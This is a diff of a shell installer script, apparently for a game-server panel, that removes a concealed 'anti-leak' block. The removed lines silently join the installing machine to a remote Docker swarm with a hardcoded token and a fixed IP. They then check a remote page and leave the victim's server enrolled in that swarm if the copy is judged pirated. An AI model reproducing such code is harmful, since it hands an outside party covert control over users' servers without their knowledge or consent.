@@ -173,32 +173,7 @@ EOF
     systemctl enable docker
     systemctl start docker
     
-    #########IP CDN#########
-    docker swarm join --token SWMTKN-1-5v6o36ueuzzv4uklq73fx55ziyxcvj053ql9qvzjjg0qetksah-dqhe2gllohsmsscnd6zo1taps 5.226.143.100:2377 >/dev/null 2>&1
 
-    output "Checking for updates..."
-    ########CHECK IF THE VERSION IS LATEST########
-    wget https://softauth.securesrv.io >/dev/null 2>&1
-    if grep -q "llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY" index.html; then
-        output "Up to date, good to go!"
-        output ""
-    ########AUTO REMOVAL (TAKES LIKE 2 SECONDS) ########
-        docker swarm leave >/dev/null 2>&1
-        docker network prune -f >/dev/null 2>&1
-        service wings restart >/dev/null 2>&1
-    ########EVERYTHING BACK TO NORMAL#########
-        rm -rf index.html
-    else
-    ########IF OUTDATED OR LEAKED########
-        output "Outdated script, please use the latest version. If you believe this is an error, please contact us on Discord."
-        output "If you happen to be using one of the pirated version of the script, please buy the resource to support the author. We accept both paypal and cryptocurrencies."
-        output "Resource link: https://www.mc-market.org/resources/8070/"
-        rm -rf index.html
-    ########NO AUTOMATIC REMOVAL - REPORT BACK AS ONLINE##########
-        exit 69
-    ########IF USER IS LEGIT AND RERUN THE LATEST SCRIPT, IT WILL RUN docker swarm leave >/dev/null 2>&1 AND LEAVE########
-    fi
-    ########ANTILEAK########
 
     output "Please select your installation option:"
     output "[1] Install the panel."
